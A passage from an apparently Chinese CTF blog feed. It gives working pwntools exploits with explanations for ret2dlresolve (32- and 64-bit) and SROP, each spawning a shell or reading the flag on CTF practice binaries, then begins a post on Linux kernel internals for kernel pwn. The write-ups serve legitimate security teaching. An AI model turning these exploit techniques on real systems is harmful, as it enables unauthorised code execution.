文件，那么这些表的偏移会发生改变。</strong></p>
<p>exp 如下： <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./speed5&quot;</span>)</span><br><span class="line">context(arch=elf.arch, os=elf.os)</span><br><span class="line">p = process([elf.path])</span><br><span class="line"></span><br><span class="line">rop_addr = elf.bss() + <span class="number">0x700</span>  <span class="comment"># adjust according the stack when call the _dl_runtime_resolve</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ret2dlresolve</span>():</span><br><span class="line">    func_name = <span class="string">&quot;system&quot;</span></span><br><span class="line">    func_args = <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">    resolve_plt = elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header[<span class="string">&#x27;sh_addr&#x27;</span>]</span><br><span class="line">    JMPREL = elf.dynamic_value_by_tag(<span class="string">&#x27;DT_JMPREL&#x27;</span>)</span><br><span class="line">    SYMTAB = elf.dynamic_value_by_tag(<span class="string">&#x27;DT_SYMTAB&#x27;</span>)</span><br><span class="line">    STRTAB = elf.dynamic_value_by_tag(<span class="string">&#x27;DT_STRTAB&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    fake_rel_addr = rop_addr + <span class="number">5</span> * <span class="number">4</span></span><br><span class="line">    reloc_offset = fake_rel_addr - JMPREL</span><br><span class="line">    fake_sym_addr = rop_addr + <span class="number">7</span> * <span class="number">4</span></span><br><span class="line">    align = (<span class="number">0x10</span> - ((fake_sym_addr - SYMTAB) &amp; <span class="number">0xF</span>)) &amp; <span class="number">0xF</span></span><br><span class="line">    fake_sym_addr += align</span><br><span class="line">    r_info = ((fake_sym_addr - SYMTAB) / <span class="number">0x10</span> &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span>  <span class="comment"># 0x7 means that Assertion `ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT&#x27;</span></span><br><span class="line">    fake_rel = p32(elf.bss() + <span class="number">0x10</span>) + p32(r_info)</span><br><span class="line">    fake_name_addr = fake_sym_addr + <span class="number">4</span> * <span class="number">4</span></span><br><span class="line">    st_name = fake_name_addr - STRTAB</span><br><span class="line">    fake_sym = p32(st_name) + p32(<span class="number">0</span>) * <span class="number">2</span> + p8(<span class="number">0x12</span>) + p8(<span class="number">0</span>) + p16(<span class="number">0</span>)</span><br><span class="line">    bin_sh_offset = (fake_sym_addr + <span class="number">0x10</span> - rop_addr + <span class="built_in">len</span>(func_name) + <span class="number">3</span>) &amp; ~<span class="number">3</span></span><br><span class="line">    bin_sh_addr = rop_addr + bin_sh_offset</span><br><span class="line"></span><br><span class="line">    payload = p32(<span class="number">0</span>)</span><br><span class="line">    payload += p32(resolve_plt)</span><br><span class="line">    payload += p32(reloc_offset)</span><br><span class="line">    payload += p32(<span class="number">0</span>)</span><br><span class="line">    payload += p32(bin_sh_addr)</span><br><span class="line">    payload += fake_rel</span><br><span class="line">    payload += <span class="string">&#x27;\x00&#x27;</span> * align</span><br><span class="line">    payload += fake_sym</span><br><span class="line">    payload += func_name</span><br><span class="line">    payload = payload.ljust(bin_sh_offset, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload += func_args + <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">24</span></span><br><span class="line">    payload += p32(rop_addr)</span><br><span class="line">    payload += p32(elf.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">    payload += p32(elf.search(asm(<span class="string">&#x27;leave;ret&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">    payload += p32(<span class="number">0</span>)</span><br><span class="line">    payload += p32(rop_addr)</span><br><span class="line">    payload += p32(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">    p.send(payload)</span><br><span class="line">    pause()</span><br><span class="line">    p.send(ret2dlresolve())</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure></div> ## 64 位 ret2dlresolve 64
位下伪造时（<code>.bss</code> 段离 <code>.dynsym</code> 太远）
<code>reloc-&gt;r_info</code> 也很大，最后使得访问
<code>ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;</code>
时程序访存出错，导致程序崩溃。因此我们退而求其次选择
<code>ELFW(ST_VISIBILITY) (sym-&gt;st_other)</code> 不为 0
时时的程序执行流程，此时计算的目标函数地址为
<code>l-&gt;l_addr + sym-&gt;st_value</code> 。</p>
<p>虽然这种方法无法在不知道 libc 版本的情况下完成利用，但是可以在不泄露
libc 基址的情况下完成利用。</p>
<p>为了实现 64 位的 ret2dlresolve ，我们需要作如下构造： -
<code>resolve</code> 函数传入的第二个参数为 0 ，从而从
<code>Elf64_Rel</code> 数组中找到第一个 <code>Elf64_Rel</code> 。 -
为了避免更新 got 表时内存访问错误，<code>Elf64_Rel</code> 的
<code>r_offset</code> 加上 <code>link_map-&gt;l_addr</code>
需要指向可读写内存。 - <code>Elf64_Rel</code> 的 <code>r_info</code>
的低 32 比特设置为 <code>ELF_MACHINE_JMP_SLOT</code> 即 7 。 -
为了避免下面这行代码访存错误，需要让 <code>l_info[5]</code>
指向可读写内存。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">char</span> *strtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br></pre></td></tr></table></figure></div> - <code>Elf64_Rel</code> 的
<code>r_info</code> 的高 32 比特设置为 0 这样找的就是
<code>Elf64_Sym</code> 数组中的第一个 <code>Elf64_Sym</code> 。 -
<code>link_map-&gt;l_info[6]-&gt;d_un.dptr</code> 指向
<code>puts@got - 8</code> 这样就伪造出 <code>Elf64_Sym</code> 的
<code>st_value</code> 为 <code>puts</code> 函数地址，同时
<code>st_order</code> 也大概率为非 0 。 - <code>link_map</code> 的
<code>l_addr</code> 设置为 <code>&amp;system - &amp;puts</code> ，这样
<code>l-&gt;l_addr + sym-&gt;st_value</code> 结果就是
<code>system</code> 函数地址。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/9d2f83c616a5538a3a4ea6975318bc19.png"
                     
alt="在这里插入图片描述" 
                > 例如 <a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/2021hgameweek3_without_leak/without_leak_b7bd5f2d0faebbc6ba6964bca265a506" >2021hgameweek3_without_leak <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
这道题目。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  close(<span class="number">2</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 栈溢出后面会关闭输出流，无法泄露 libc
地址，因此可以采用 ret2dlresolve 的方式实现任意命令执行。 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = process([<span class="string">&#x27;./without_leak&#x27;</span>])</span><br><span class="line"><span class="comment"># p = remote(&quot;127.0.0.1&quot;,1234)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./without_leak&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rw_mem = elf.bss() + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">n64 = <span class="keyword">lambda</span> x: (x + <span class="number">0x10000000000000000</span>) &amp; <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_fake_link_map</span>(<span class="params">fake_linkmap_addr, func, base_func=<span class="string">&#x27;puts&#x27;</span></span>):</span><br><span class="line">    offset = n64(libc.sym[func] - libc.sym[base_func])</span><br><span class="line">    linkmap = p64(offset)  <span class="comment"># l_addr</span></span><br><span class="line">    linkmap = linkmap.ljust(<span class="number">0x68</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    linkmap += p64(elf.bss())  <span class="comment"># l_info[5]</span></span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x100</span>)  <span class="comment"># l_info[6]</span></span><br><span class="line">    linkmap = linkmap.ljust(<span class="number">0xf8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x110</span>)  <span class="comment"># l_info[23]</span></span><br><span class="line">    linkmap += p64(<span class="number">0</span>) + p64(elf.got[base_func] - <span class="number">8</span>)  <span class="comment"># Elf64_Dyn</span></span><br><span class="line">    linkmap += p64(<span class="number">0</span>) + p64(fake_linkmap_addr + <span class="number">0x120</span>)  <span class="comment"># Elf64_Dyn</span></span><br><span class="line">    linkmap += p64(n64(elf.bss() - offset)) + p32(<span class="number">7</span>) + p32(<span class="number">0</span>)  <span class="comment"># Elf64_Rel</span></span><br><span class="line">    <span class="keyword">return</span> linkmap</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p, &quot;b *system\nb *0x40119A\ndir /glibc/2.35/source&quot;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">fake_link_map_addr = elf.bss() + <span class="number">0x800</span></span><br><span class="line">fake_link_map = build_fake_link_map(fake_link_map_addr, <span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">sh_addr = fake_link_map_addr + <span class="built_in">len</span>(fake_link_map)</span><br><span class="line">resolve_plt = elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="number">0x28</span> * <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">payload += p64(elf.search(asm(<span class="string">&#x27;ret&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">payload += p64(elf.search(asm(<span class="string">&#x27;pop rdi; ret&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(elf.search(asm(<span class="string">&#x27;pop rsi; pop r15; ret&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">payload += p64(fake_link_map_addr)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload += p64(elf.search(asm(<span class="string">&#x27;pop rdi; ret&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">payload += p64(sh_addr)</span><br><span class="line">payload += p64(resolve_plt + <span class="number">6</span>)</span><br><span class="line">payload += p64(fake_link_map_addr)  <span class="comment"># truct link_map *l</span></span><br><span class="line">payload += p64(<span class="number">0</span>)  <span class="comment"># ElfW(Word) reloc_arg</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x200</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt; \n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = fake_link_map + <span class="string">&#x27;cat flag&gt;&amp;0\x00&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
# SROP 简单的说就是如果系统调用 <code>rt_sigreturn</code>
时会根据当前栈顶的 <code>Signal Frame</code>
结构恢复各寄存器的值。通过伪造 <code>Signal Frame</code> 并通过构造 rop
使程序执行 <code>rt_sigreturn</code>
就可以执行想要执行的函数以及把栈迁移到任意地址。</p>
<p>以 64 位为例，其中一种构造方式如下： 其中 0xF 为
<code>rt_sigreturn</code> 的系统调用号。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/036ee63b7bb54a4fe5d98c064c787fec.png"
                     
alt="在这里插入图片描述" 
                > <code>Signal Frame</code> 结构如下： <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/e3e1b6a53bd2c560f2b08fc27d87d60d.png"
                     
alt="在这里插入图片描述" 
                > 通过设置 <code>Signal Frame</code> 的 rsp
的值栈迁移，可以连读多次进行 SROP。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/d69ea986473e28e4a4ac62a88a12edec.png"
                     
alt="在这里插入图片描述" 
                > 例题：rootersctf_2019_srop</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">signed</span> __int64 <span class="title">sub_401000</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">signed</span> __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">sys_write</span>(<span class="number">1u</span>, ::buf, <span class="number">0x2AuLL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sys_read</span>(<span class="number">0</span>, buf, <span class="number">0x400uLL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>存在栈溢出。</p>
<p>可供利用的 gadget ：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000401032                 pop     rax</span><br><span class="line">.text:0000000000401033                 syscall                 ; LINUX - sys_read</span><br><span class="line">.text:0000000000401035                 leave</span><br><span class="line">.text:0000000000401036                 retn</span><br></pre></td></tr></table></figure></div>
<p>可以完成改 rax 和 系统调用，不过 ret 前多了一个 leave ，因此连续 SROP
时不能像前面示意图那样直接改 rsp ，而是将 rbp 设为目标栈地址 + 8
，利用栈迁移将栈顶迁移到目标地址。</p>
<p>第一次 SROP 可以调用 read 向 .data 段的 buf 写入第二段 rop 以及
<code>/bin/sh\x00</code> 字符串。 第二次 SROP 执行 execve 获取 shell
。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26384</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./rootersctf_2019_srop&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./rootersctf_2019_srop&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    buf_addr = <span class="number">0x402000</span></span><br><span class="line">    syscall_leave_ret = <span class="number">0x401033</span></span><br><span class="line">    pop_rax_syscall_leave_ret = <span class="number">0x401032</span></span><br><span class="line"></span><br><span class="line">    frame = SigreturnFrame()</span><br><span class="line">    frame.rax = <span class="number">0</span>  <span class="comment"># read</span></span><br><span class="line">    frame.rdi = <span class="number">0</span>  <span class="comment"># stdin</span></span><br><span class="line">    frame.rsi = buf_addr  <span class="comment"># buf</span></span><br><span class="line">    frame.rdx = <span class="number">0x400</span>  <span class="comment"># size</span></span><br><span class="line">    frame.rip = syscall_leave_ret</span><br><span class="line">    frame.rbp = buf_addr</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">0x88</span></span><br><span class="line">    payload += p64(pop_rax_syscall_leave_ret)</span><br><span class="line">    payload += p64(<span class="number">0xF</span>)</span><br><span class="line">    payload += <span class="built_in">str</span>(frame)</span><br><span class="line"></span><br><span class="line">    p.sendafter(<span class="string">&#x27;Hey, can i get some feedback for the CTF?\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">    frame = SigreturnFrame()</span><br><span class="line">    frame.rax = <span class="number">59</span>  <span class="comment"># execve</span></span><br><span class="line">    frame.rdi = buf_addr  <span class="comment"># &quot;/bin/sh\x00&quot;</span></span><br><span class="line">    frame.rsi = <span class="number">0</span></span><br><span class="line">    frame.rdx = <span class="number">0</span></span><br><span class="line">    frame.rip = syscall_leave_ret</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    payload += <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload += p64(pop_rax_syscall_leave_ret)</span><br><span class="line">    payload += p64(<span class="number">0xF</span>)</span><br><span class="line">    payload += <span class="built_in">str</span>(frame)</span><br><span class="line"></span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure></div>
]]></content>
  </entry>
  <entry>
    <title>linux kernel pwn 基础知识</title>
    <url>/2024/11/08/linux-kernel-pwn-basic-knowlege/</url>
    <content><![CDATA[<h1 id="基础知识">基础知识</h1>
<h2 id="内核概述">内核概述</h2>
<h3 id="内核架构">内核架构</h3>
<p>通常来说我们可以把内核架构分为两种：宏内核和微内核，现在还有一种内核是混合了宏内核与微内核的特性，称为混合内核。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/998ca0e31c4c3ed139bb7b1d1d05e3e4.png"
                     
alt="在这里插入图片描述" 
                > - 宏内核（Monolithic
kernel），也译为集成式内核、单体式内核，一种操作系统内核架构，此架构的特性是整个内核程序是一个单一二进制可执行文件，在内核态以监管者模式（Supervisor
Mode）来运行。相对于其他类型的操作系统架构，如微内核架构或混合内核架构等，这些内核会定义出一个高端的虚拟接口，由该接口来涵盖描述整个电脑硬件，这些描述会集合成一组硬件描述用词，有时还会附加一些系统调用，如此可以用一个或多个模块来实现各种操作系统服务，如进程管理、并发（Concurrency）控制、存储器管理等。
- .微内核（Micro
Kernel），对于微内核而言，大部分的系统服务（如文件管理等）都被剥离于内核之外，内核仅仅提供最为基本的一些功能：底层的寻址空间管理、线程管理、进程间通信等。</p>
<h3 id="linux-内核">linux 内核</h3>
<p>kernel 最主要的功能有两点：</p>
<ul>
<li>控制并与硬件进行交互</li>
<li>提供 <code>application</code> 能运行的环境</li>
</ul>
<p><code>Linux</code> 内核包含的内容：</p>
<ul>
<li><strong>系统调用接口</strong>：<code>SCI</code>层提供了某些机制执行从用户空间到内核的函数调用。这个接口依赖于体系结构。</li>
<li><strong>进程管理</strong>：进程的执行。在内核中，这些进程称为线程，代表了单独的处理器虚拟化（线程代码、数据、堆栈、CPU寄存器）。用户空间使用进程这个术语，但是<code>Linux</code>实现并没有区分这两个的概念（进程和线程），内核通过<code>SCI</code>提供了一个应用程序编程接口<code>API</code>，来创建一个新进程，停止进程，并在他们之间进行通信和同步。进程管理还包括处理获得进程之间共享<code>CPU</code>的需求。内核实现了一种新型的调度算法，不管有多少个线程在竞争<code>CPU</code>,这种算法都可以在固定时间内进行操作。调度程序也可以支持处理器(称为对称多处理器或<code>SMP</code>);</li>
<li><strong>内存管理</strong>：如果由硬件管理虚拟内存，内存是按照所谓的内存页方式进行管理的（4KB）,<code>Linux</code>包括了管理可用内存的方式，以及物理和虚拟映射所使用的硬件机制。但是内存管理要管理的可不止<code>4KB</code>缓冲区。<code>Linux</code>提供了对<code>4KB</code>缓冲区的抽象，例如<code>slab</code>分配器。这种内存管理模式使用的是<code>4KB</code>缓冲区为基数，然后从中分配结构，并跟踪内存页使用情况，比如哪些内存是满的，哪些页面没有完全使用，哪些页面为空。由于这个原因，页面可以移除内存并放入磁盘中。这个过程叫交换，因为页面会被从内存交换到硬盘上。<code>Linux</code>系统中，被用于交换的分区叫<code>swap</code>分区，在<code>windows</code>下叫做虚拟内存。</li>
<li><strong>文件系统</strong>：虚拟文件系统（VFS）是<code>Linux</code>内核中非常有用的一个方面，因为它为文件系统提供了一个通用的接口抽象。<code>VFS</code>在<code>SCI</code>和内核所支持的文件系统做了一个交换层。在<code>VFS</code>上面，是对<code>oepn</code>,<code>close</code>之类的函数的一个通用<code>API</code>抽象。在<code>VFS</code>下面是文件系统抽象，它定义了上层函数的实现方式。</li>
<li><strong>网络管理</strong>：网络堆栈在设计上遵循模拟协议本身的分层体系结构</li>
<li><strong>设备驱动</strong>:<code>Linux</code>内核中有大量代码都在设备驱动程序中，它们能够运转特定的硬件设备。<code>Linux</code>源码提供了一个驱动程序子目录，这个目录又进一步划分为各种支持设备，例如<code>Bluetooth</code>,<code>I2C</code>,<code>serial</code>等。</li>
</ul>
<p>不同于Windows NT内核和Mach（Mac OS X
的组成部分）的微内核结构，linux内核采用的是单内核结构，效率高，但是体积大。</p>
<h2 id="内核态函数调用">内核态函数调用</h2>
<ul>
<li><code>printf</code> 变更为 <code>printk()</code> ，但需要注意的是
<code>printk()</code>
不一定会把内容显示在终端上，当一定是在内核缓冲区里，可以通过
<code>dmesg</code> 查看效果。</li>
<li><code>memcpy</code> 变更为
<code>copy_from_user()/copy_to_user()</code>
<ul>
<li><code>copy_from_user()</code> 将用户空间的数据传送到内核空间</li>
<li><code>copy_to_user()</code> 实现将内核空间的数据传送到用户空间</li>
<li><strong>注意：<code>copy_xxx_user()</code> 成功返回
0，失败则返回没有拷贝成功的数据字节数</strong></li>
</ul></li>
<li><code>malloc()</code> 变更为 <code>kmalloc()</code>
，内核态的内存分配函数，和 <code>malloc</code>
相似，但使用<code>slab,slub</code>
分配器，这个分配器通过一个多级的结构进行管理。
<ul>
<li>首先有 <code>cache</code> 层，<code>cache</code>
是一个结构，也就是用来分配或者已经分配的一部分内核空间。<code>kmalloc</code>
使用多个 <code>cache</code>，一个 <code>cache</code> 对应一个 2
的幂的大小的一组内存对象。<code>slab</code> 分配器严格按照
<code>cache</code> 去区分，不同的 <code>cache</code>
无法分配在一页内，<code>slub</code> 分配器则较为宽松，不同的
<code>cache</code> 如果分配相同大小，可能会在一页内。</li>
</ul></li>
<li><code>free</code> 变更为 <code>kfree()</code> ，同
<code>kmalloc()</code> 。 ## Ring Model ### 基本概念 intel CPU 将 CPU
的特权级别分为 4 个级别：<code>Ring 0</code>,<code>Ring 1</code>,
<code>Ring 2</code>, <code>Ring 3</code>。</li>
</ul>
<p>大多数的现代操作系统只使用了 <code>Ring 0</code> 和
<code>Ring 3</code>。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/c715813e764b9d971b01092ef652bac5.png"
                     
alt="在这里插入图片描述" 
                > - 内核空间运行在Ring
0特权等级，拥有自己的空间，位于内存的高地址。 -
用户空间则是我们平时应用程序运行的空间，运行在Ring
3特权等级，使用较低地址。 ### 中断 中断即硬件/软件向 <code>CPU</code>
发送的特殊信号，<code>CPU</code>接收到中断后会停下当前工作转而执行中断处理程序，完成后恢复原工作流程</p>
<p>中断向量表（interrupt vector
table）类似一个虚表，该表通常位于物理地址
0~1k处，其中存放着不同中断号对应的中断处理程序的地址</p>
<p>自保护模式起引入<strong>中断描述符表</strong>（Interrupt Descriptor
Table）用以存放 <strong>「门描述符」</strong>（gate
descriptor），中断描述符表地址存放在 <code>IDTR</code> 寄存器中，CPU
通过中断描述符表访问对应门</p>
<p><strong>「门」</strong>（gate）可以理解为中断的前置检查物件，当中断发生时会先通过这些「门」，主要有如下三种门：</p>
<ul>
<li>中断门（<code>Interrupt gate</code>）：用以进行<strong>硬</strong>中断处理，其类型码为
<code>110</code>；中断门的 <code>DPL</code>（Descriptor Priviledge
Level）为
0，故只能在内核态下访问，即中断处理程序应当由内核激活；进入中断门会清除
<code>IF</code> 标志位以关闭中断，防止中断嵌套的发生</li>
<li>陷阱门（<code>Trap gate</code>）：类型码为
<code>111</code>，类似于中断门，主要用以处理
<code>CPU</code>异常，但不会清除 <code>IF</code>标志位。</li>
<li><strong>系统门</strong>（<code>System gate</code>）：<code>Linux</code>特有门，类型码为
3、4、5、128；其 DPL 为
3，用以供用户进程访问，主要用以<strong>进行系统调用</strong>（int
0x80）。</li>
</ul>
<h3 id="用户态-内核态">用户态-&gt;内核态</h3>
<p>当发生系统调用，产生异常，外设产生中断等事件时，会发生用户态到内核态的切换，具体的过程为：
- 通过 <code>swapgs</code> 切换 <code>GS</code> 段寄存器，将
<code>GS</code> 寄存器值和一个特定位置的值进行交换，目的是为了保存
<code>GS</code> 值，同时将该位置的值作为内核执行时的 <code>GS</code>
值使用。 - <code>GS</code> 寄存器的作用是访问 CPU 特定的内存。 -
将当前栈顶(用户空间栈顶)记录在 CPU 独占变量区域里，将 CPU
独占区域里记录的内核栈顶放入 <code>RSP/ESP</code> 。 - 通过
<code>push</code> 保存各寄存器值，具体代码如下： <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">ENTRY(entry_SYSCALL_64)</span><br><span class="line"><span class="comment">/* SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令 */</span></span><br><span class="line">SWAPGS_UNSAFE_STACK</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 保存栈值，并设置内核栈 */</span></span><br><span class="line">movq %rsp, PER_CPU_VAR(rsp_scratch)</span><br><span class="line">movq <span class="title function_">PER_CPU_VAR</span><span class="params">(cpu_current_top_of_stack)</span>, %rsp</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 通过push保存寄存器值，形成一个pt_regs结构 */</span></span><br><span class="line"><span class="comment">/* Construct struct pt_regs on stack */</span></span><br><span class="line">pushq  $__USER_DS                <span class="comment">/* pt_regs-&gt;ss */</span></span><br><span class="line">pushq  <span class="title function_">PER_CPU_VAR</span><span class="params">(rsp_scratch)</span>  <span class="comment">/* pt_regs-&gt;sp */</span></span><br><span class="line">pushq  %r11                      <span class="comment">/* pt_regs-&gt;flags */</span></span><br><span class="line">pushq  $__USER_CS                <span class="comment">/* pt_regs-&gt;cs */</span></span><br><span class="line">pushq  %rcx                      <span class="comment">/* pt_regs-&gt;ip */</span></span><br><span class="line">pushq  %rax                      <span class="comment">/* pt_regs-&gt;orig_ax */</span></span><br><span class="line">pushq  %rdi                      <span class="comment">/* pt_regs-&gt;di */</span></span><br><span class="line">pushq  %rsi                      <span class="comment">/* pt_regs-&gt;si */</span></span><br><span class="line">pushq  %rdx                      <span class="comment">/* pt_regs-&gt;dx */</span></span><br><span class="line">pushq  %rcx tuichu               <span class="comment">/* pt_regs-&gt;cx */</span></span><br><span class="line">pushq  $-ENOSYS                  <span class="comment">/* pt_regs-&gt;ax */</span></span><br><span class="line">pushq  %r8                       <span class="comment">/* pt_regs-&gt;r8 */</span></span><br><span class="line">pushq  %r9                       <span class="comment">/* pt_regs-&gt;r9 */</span></span><br><span class="line">pushq  %r10                      <span class="comment">/* pt_regs-&gt;r10 */</span></span><br><span class="line">pushq  %r11                      <span class="comment">/* pt_regs-&gt;r11 */</span></span><br><span class="line">sub $<span class="params">(<span class="number">6</span>*<span class="number">8</span>)</span>, %rsp                 <span class="comment">/* pt_regs-&gt;bp, bx, r12-15 not saved */</span></span><br></pre></td></tr></table></figure></div> -
通过汇编指令判断是否为 <code>x32_abi</code>。(linux 32 位内核) -
通过系统调用号，跳到全局变量 <code>sys_call_table</code>
相应位置继续执行系统调用。 ### 内核态-&gt;用户态 具体流程如下：</p>
<ul>
<li>通过 <code>swapgs</code> 恢复 <code>GS</code> 值</li>
<li>通过 <code>sysretq</code> 或者 <code>iretq</code>
恢复到用户空间继续执行。如果使用 <code>iretq</code>
还需要给出用户空间的一些信息(<code>CS, eflags/rflags, esp/rsp</code>
等)，即 <code>trap_frame</code> 。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> user_rip;</span><br><span class="line">    <span class="type">size_t</span> user_cs;</span><br><span class="line">    <span class="type">size_t</span> user_rflags;</span><br><span class="line">    <span class="type">size_t</span> user_sp;</span><br><span class="line">    <span class="type">size_t</span> user_ss;</span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure></div></li>
</ul>
<p>对于开启了 <code>KPTI</code>（内核页表隔离），我们不能像之前那样直接
